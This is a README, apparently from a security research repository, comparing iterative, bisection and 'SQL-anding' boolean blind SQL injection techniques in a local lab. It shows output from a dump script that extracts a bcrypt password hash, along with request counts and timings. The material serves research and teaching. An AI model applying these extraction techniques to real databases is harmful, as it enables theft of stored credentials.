# Faster (Boolean) Blind SQLi

Inspired by this [paper](https://aircconline.com/csit/papers/vol10/csit101909.pdf) by Ruben Ventura. Watch my [YouTube Video]()

Data: [Google Sheets](https://docs.google.com/spreadsheets/d/1FdOYCAtdOS3T62VdZSJWqQMLSwO-H0sDMOxKyOotkRc/edit?usp=sharing)
- *Server:* HP Elitebook (**RAM: 32GB, CPU: Intel i7 vPro 8th Gen**) running **MariaDB + Apache2** on **local network**
- *Attacker:* PC (**RAM: 16GB, CPU: AMD Ryzen 7 5800X**)

Example output:
```bash
kali@kali$ python3 dump.py 12
[+] Oracle verified

--- ITERATIVE ---
[+] $2a$12$HEXnjRPQxxSLVrdUSf7d6.uHn2LZt4vyZ2CN66L/qI177ovoHea66

[*] Total number of requests: 4827
[*] Average requests per char: 80.450
[*] Time elapsed: 4.129857 seconds

--- BISECTION ---
[+] $2a$12$HEXnjRPQxxSLVrdUSf7d6.uHn2LZt4vyZ2CN66L/qI177ovoHea66

[*] Total number of requests: 420
[*] Average requests per char: 7.000
[*] Time elapsed: 0.071599 seconds

--- SQL-ANDING ---
[+] $2a$12$HEXnjRPQxxSLVrdUSf7d6.uHn2LZt4vyZ2CN66L/qI177ovoHea66

[*] Total number of requests: 420
[*] Average requests per char: 7.000
[*] Time elapsed: 0.069890 seconds
```